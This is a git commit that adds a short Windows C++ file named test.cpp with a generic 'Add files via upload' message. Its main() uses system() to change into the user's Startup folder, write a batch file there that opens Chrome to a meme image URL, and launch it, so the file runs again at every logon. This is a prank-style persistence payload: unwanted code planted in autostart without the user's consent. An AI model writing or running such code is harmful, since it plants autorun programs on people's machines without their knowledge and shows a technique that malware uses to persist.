e1f89257bcb418438ae205806cdd4dcd03a07bea
GurnoorChahal <84887554+GurnoorChahal@users.noreply.github.com>
2021-08-03 14:47:09 +1000

    Add files via upload
    Source

---
+++ test.cpp
@@ -0,0 +1,9 @@
+#include <windows.h>
+
+using namespace std;
+
+int main(){
+    // const char* cring = "";
+    system("cd %appdata% && echo good 1 && echo good 2 && cd microsoft && echo good 3 && cd windows && echo good 4 && cd \"start menu\" && echo good 4 && cd programs && echo good 5 && cd \"startup\" && echo good 6 && echo start chrome.exe https://cdn2.unrealengine.com/amoguslandscape-2560x1440-2c59395f3208.jpg >> a.bat  && start a.bat && echo done");
+    return 0;
+}
